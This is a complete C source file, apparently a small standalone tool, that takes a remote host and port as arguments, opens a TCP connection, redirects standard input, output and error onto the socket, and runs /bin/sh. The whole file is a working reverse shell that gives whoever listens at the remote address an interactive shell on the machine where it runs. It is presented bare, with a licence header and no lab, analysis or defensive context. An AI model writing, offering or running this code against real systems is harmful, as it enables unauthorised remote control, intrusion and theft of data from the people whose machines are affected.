/*
** Copyright (C) 2016 Ali H. Fardan <raiz@firemail.cc>
**
** Permission to use, copy, modify, and/or distribute this software for any
** purpose with or without fee is hereby granted, provided that the above
** copyright notice and this permission notice appear in all copies.
**
** THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
** REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
** AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
** INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
** LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE
** OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
** PERFORMANCE OF THIS SOFTWARE.
*/

#include <sys/socket.h>
#include <sys/types.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>

static int
dial(const char *addr, const char *port)
{
	struct addrinfo hints;
	struct addrinfo *res, *rp;
	int sockfd, s;

	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family		= AF_UNSPEC;
	hints.ai_socktype	= SOCK_STREAM;
	hints.ai_protocol	= 0;
	hints.ai_flags		= 0;

	s = getaddrinfo(addr, port, &hints, &res);
	if(s < 0)
		return -1;

	for(rp = res; rp != NULL; rp = rp->ai_next){
		sockfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if(sockfd < 0)
			continue;
		if(connect(sockfd, rp->ai_addr, rp->ai_addrlen) == 0)
			break;
		close(sockfd);
	}

	if(rp == NULL)
		return (-1);
	freeaddrinfo(res);

	return sockfd;
}

int
main(int argc, char *argv[])
{
	int sockfd;
	const char *rhost = argv[1];
	const char *rport = argv[2];
	char *const cmd[] = {"/bin/sh", (char *)0};
	char *const env[] = {(char *)0};
	if(rhost == NULL || rport == NULL)
		return (-1);
	sockfd = dial(rhost, rport);
	if(sockfd == -1)
		return (-1);
	(void)dup2(sockfd, 0);
	(void)dup2(0, 1);
	(void)dup2(0, 2);
	execve("/bin/sh", cmd, env);

	return (0);
}
